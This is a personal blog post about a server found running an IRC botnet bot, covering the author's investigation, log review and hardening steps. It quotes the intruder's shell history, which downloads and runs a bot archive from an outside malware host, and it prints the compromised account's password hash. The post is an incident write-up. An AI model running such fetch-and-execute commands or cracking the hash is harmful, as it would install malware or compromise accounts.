---
title: Haxxed
date: 2015-05-02T20:54:09
tags: ["hacked", "hack", "hacker", "botnet"]
guid: "https://blog.afoolishmanifesto.com/posts/haxxed"
---
This has been a pretty big week for me;  On Tuesday we listed our house to be
sold!  On Wednesday night I got what I thought was indigestion, and on Thursday
had an appendectomy!  Just today, Saturday, I think we have sold the house
(pending all required legal grace periods of course.)

This all pales in comparison to the *really* big news this week:
**this server got hacked**.

Saturday morning I noticd that Freenode was blocking my IRC client because I was
on some blocklist (DroneBL, to be specific.)  I looked into it briefly with
[mst](http://shadow.cat/blog/matt-s-trout/)'s help.  I verified that I wasn't an open
email relay with [an automated tool](http://www.mailradar.com/openrelay/) and
then manually checked that I wasn't accidentally proxying any http without
realizing it.  Matt's idea was that maybe their was an automated check for an
http proxy and my server wasn't "correctly" returning a 401/403.

I emailed the block list (twice actually, the first time their UI got an error
and dropped the message; the second time the UI got a different error and
delivered it) and thankfully got a very complete and helpful response...

It turns out that the message shown on the blocklist website was pretty
misleading, as it was mostly vitriol about bumbling sysadmins with open HTTP
proxies, but what I was on the list for was for being part of an IRC botnet!

The email included instructions on how to find a certain class of bot on the
server, which I'll leave out since it's not really that interesting.

When I found the bot it was indeed pretty interesting.  First off, it was
installed in `/home/git/.gnome`.  Before I go into the guts of that folder lets
do some detective work and take a look at the (apparently unaltered)
`.bash_history`:

```
ps x
ping ircu.atw.hu
cd /
ls -a
cd
wget md3701.pop3.ru/bot/zm3u.tgz
tar zxvf zm3u.tgz
cd .gnome
ls -a
./start alibaba
ps x
ls
cd
ls
ls bin
gitolite 
cd gitolite/
ls
git status
git log
git pull
ls
cd ..
gitolite
gitolite list-users
gitolite list-repos
gitolite list-phy-repos
gitolite setup -h
ls
rm frew.pub 
vi frew@wanderlust.pub
gitolite setup -pk frew\@wanderlust.pub 
exit
cd
cd repositories/
s
ls
vi blog.git/hooks/update
exit
w
free -m
traceroute ircu.atw.hu
cd
ls
vi frew\@wanderlust.pub 
gitolite
gitolite setup -h
ls
vi foo.pub
gitolite setup -pk foo.pub 
rm foo.pub frew\@wanderlust.pub 
exit
```

I'm almost positive that the gitolite stuff (basically everything after the
second `ps x`) is me.  This is corroborated by the fact that all of my git
repositories, including the gitolite admin repo, have the expected contents.

## How did this happen?

I tried to find out exactly when the server got hacked by looking through the
authentication logs.  Unfortunately the logs are a little misleading.  Here is a
log selection from `auth.log.4.gz`:

```
Mar 29 07:27:01 li490-218 CRON[30137]: pam_unix(cron:session): session opened for user git by (uid=0)
Mar 29 07:27:01 li490-218 CRON[30137]: pam_unix(cron:session): session closed for user git
```

Then there is a section from `auth.log.2.xz`:

```
Mar 30 07:27:00 li490-218 sshd[23591]: Invalid user octav from 63.168.234.230
Mar 30 07:27:00 li490-218 sshd[23591]: input_userauth_request: invalid user octav [preauth]
Mar 30 07:27:00 li490-218 sshd[23591]: pam_unix(sshd:auth): check pass; user unknown
Mar 30 07:27:00 li490-218 sshd[23591]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=63.168.234.230 
Mar 30 07:27:02 li490-218 sshd[23591]: Failed password for invalid user octav from 63.168.234.230 port 36553 ssh2
Mar 30 07:27:02 li490-218 sshd[23591]: Received disconnect from 63.168.234.230: 11: Bye Bye [preauth]
Mar 30 07:27:12 li490-218 sshd[23593]: Invalid user octavia from 63.168.234.230
Mar 30 07:27:12 li490-218 sshd[23593]: input_userauth_request: invalid user octavia [preauth]
Mar 30 07:27:12 li490-218 sshd[23593]: pam_unix(sshd:auth): check pass; user unknown
Mar 30 07:27:12 li490-218 sshd[23593]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=63.168.234.230 
Mar 30 07:27:14 li490-218 sshd[23593]: Failed password for invalid user octavia from 63.168.234.230 port 37523 ssh2
Mar 30 07:27:14 li490-218 sshd[23593]: Received disconnect from 63.168.234.230: 11: Bye Bye [preauth]
Mar 30 07:27:14 li490-218 sshd[23595]: Invalid user octavius from 63.168.234.230
Mar 30 07:27:14 li490-218 sshd[23595]: input_userauth_request: invalid user octavius [preauth]
Mar 30 07:27:14 li490-218 sshd[23595]: pam_unix(sshd:auth): check pass; user unknown
Mar 30 07:27:14 li490-218 sshd[23595]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=63.168.234.230 
Mar 30 07:27:16 li490-218 sshd[23595]: Failed password for invalid user octavius from 63.168.234.230 port 38594 ssh2
Mar 30 07:27:16 li490-218 sshd[23595]: Received disconnect from 63.168.234.230: 11: Bye Bye [preauth]
Mar 30 07:27:26 li490-218 sshd[23597]: Invalid user october from 63.168.234.230
Mar 30 07:27:26 li490-218 sshd[23597]: input_userauth_request: invalid user october [preauth]
Mar 30 07:27:26 li490-218 sshd[23597]: pam_unix(sshd:auth): check pass; user unknown
Mar 30 07:27:26 li490-218 sshd[23597]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=63.168.234.230 
Mar 30 07:27:28 li490-218 sshd[23597]: Failed password for invalid user october from 63.168.234.230 port 38850 ssh2
Mar 30 07:27:28 li490-218 sshd[23597]: Received disconnect from 63.168.234.230: 11: Bye Bye [preauth]
Mar 30 07:27:28 li490-218 sshd[23599]: Invalid user oli from 63.168.234.230
Mar 30 07:27:28 li490-218 sshd[23599]: input_userauth_request: invalid user oli [preauth]
Mar 30 07:27:28 li490-218 sshd[23599]: pam_unix(sshd:auth): check pass; user unknown
Mar 30 07:27:28 li490-218 sshd[23599]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=63.168.234.230 
Mar 30 07:27:30 li490-218 sshd[23599]: Failed password for invalid user oli from 63.168.234.230 port 39900 ssh2
Mar 30 07:27:30 li490-218 sshd[23599]: Received disconnect from 63.168.234.230: 11: Bye Bye [preauth]
Mar 30 07:27:31 li490-218 sshd[23601]: Invalid user oliver from 63.168.234.230
Mar 30 07:27:31 li490-218 sshd[23601]: input_userauth_request: invalid user oliver [preauth]
Mar 30 07:27:31 li490-218 sshd[23601]: pam_unix(sshd:auth): check pass; user unknown
Mar 30 07:27:31 li490-218 sshd[23601]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=63.168.234.230 
Mar 30 07:27:33 li490-218 sshd[23601]: Failed password for invalid user oliver from 63.168.234.230 port 40134 ssh2
Mar 30 07:27:33 li490-218 sshd[23601]: Received disconnect from 63.168.234.230: 11: Bye Bye [preauth]
Mar 30 07:27:41 li490-218 sshd[23603]: Invalid user olivia from 63.168.234.230
Mar 30 07:27:41 li490-218 sshd[23603]: input_userauth_request: invalid user olivia [preauth]
Mar 30 07:27:41 li490-218 sshd[23603]: pam_unix(sshd:auth): check pass; user unknown
Mar 30 07:27:41 li490-218 sshd[23603]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=63.168.234.230 
Mar 30 07:27:44 li490-218 sshd[23603]: Failed password for invalid user olivia from 63.168.234.230 port 40455 ssh2
Mar 30 07:27:44 li490-218 sshd[23603]: Received disconnect from 63.168.234.230: 11: Bye Bye [preauth]
Mar 30 07:27:44 li490-218 sshd[23605]: Invalid user oprah from 63.168.234.230
Mar 30 07:27:44 li490-218 sshd[23605]: input_userauth_request: invalid user oprah [preauth]
Mar 30 07:27:44 li490-218 sshd[23605]: pam_unix(sshd:auth): check pass; user unknown
Mar 30 07:27:44 li490-218 sshd[23605]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=63.168.234.230 
Mar 30 07:27:46 li490-218 sshd[23605]: Failed password for invalid user oprah from 63.168.234.230 port 41283 ssh2
Mar 30 07:27:46 li490-218 sshd[23605]: Received disconnect from 63.168.234.230: 11: Bye Bye [preauth]
Mar 30 07:27:46 li490-218 sshd[23607]: Invalid user orders from 63.168.234.230
Mar 30 07:27:46 li490-218 sshd[23607]: input_userauth_request: invalid user orders [preauth]
Mar 30 07:27:46 li490-218 sshd[23607]: pam_unix(sshd:auth): check pass; user unknown
Mar 30 07:27:46 li490-218 sshd[23607]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=63.168.234.230 
Mar 30 07:27:48 li490-218 sshd[23607]: Failed password for invalid user orders from 63.168.234.230 port 41528 ssh2
Mar 30 07:27:48 li490-218 sshd[23607]: Received disconnect from 63.168.234.230: 11: Bye Bye [preauth]
Mar 30 07:27:59 li490-218 sshd[23609]: Invalid user orders from 63.168.234.230
Mar 30 07:27:59 li490-218 sshd[23609]: input_userauth_request: invalid user orders [preauth]
Mar 30 07:27:59 li490-218 sshd[23609]: pam_unix(sshd:auth): check pass; user unknown
Mar 30 07:27:59 li490-218 sshd[23609]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=63.168.234.230 
```

The really confusing thing here is that I would expect the lines from the 29th
(the botnet's keepalive basically) to persist into the 30th.  My theory is that
the xz and gz logging was some accidental partitioning.  At some point I
configured my server to store xz compressed rolled logs, instead of gzipped, as
the compression is noticeably better.  Surely that was a waste of time,
especially now when the logs are presumably confused.  Additionally, it sure
would be nice if the log lines started with a more sensible date format.
Ultimately looking at logs seems to have been a dead end; I don't have enough
history!

Ok, on to more interesting stuff.  So what the botnet did was ultimately start a
process called `crond`.  This is pretty clever because if you look at ps it's
pretty subtle.  Also, the bot had a cronjob installed that would automatically
start another daemon if the initial one exited (or was killed) for any reason.

After removing the cronjob and stopping the running process I seemed pretty much
extricated.  I still don't know exactly how the bot got on my server, but I have
a theory.  I created the git user probably a year ago, and it wouldn't surprise
me at all if I created it with a password and never removed the password.  When
I found the bot there was indeed a password set for the git user:

`git:$6$Lmn3H4t.$k2lsFGMs4WnJpkhbT3jS1uIm.ViY089BJvKQafLqTaGF1TH1JZgJVQDBtr2QuoTa5J9jao.e8.lXBWNYACiLi.:16042:0:99999:7:::`

According to shadow(5) this is a SHA-512 hash of a password with a salt of `Lmn3H4t.`.  It was set a couple years early in December:

```
perl -MDateTime -E"say DateTime->new( year => 1970, month => 1, day => 1)->add( days => 16042 )"
2013-12-03T00:00:00
```

I expected to be able to use Authen::Passphrase to test the password for some
common strings but sadly [it does not yet support
SHA-512](https://rt.cpan.org/Public/Bug/Display.html?id=98485).

## Recovery

After that I basically decided to turn my efforts on hardening the server so
that this should be less likely to happen in the future.  The very first thing I
did was remove and disable the password for the git user:

```
passwd -l git
```

I removed the `~/.ssh/authorized_keys`, regenerated them with gitolite and
verified the contents, as mentioned above, and they were fine.

Additionally, I removed the password for the root user, since my personal user
(`frew`) is in the sudo wheel already.

Some time soon I'll add a TOTP to my user.

I've published the code I found on my server
[here](https://github.com/frioux/zmeu-multimech).  It is a little interesting
but mostly nothing surprising.

I am considering disabling password authentication entirely over ssh, if only to
reduce the amount of noise that ends up in my authentication logs.  Any other
hardning ideas people have are welcome!
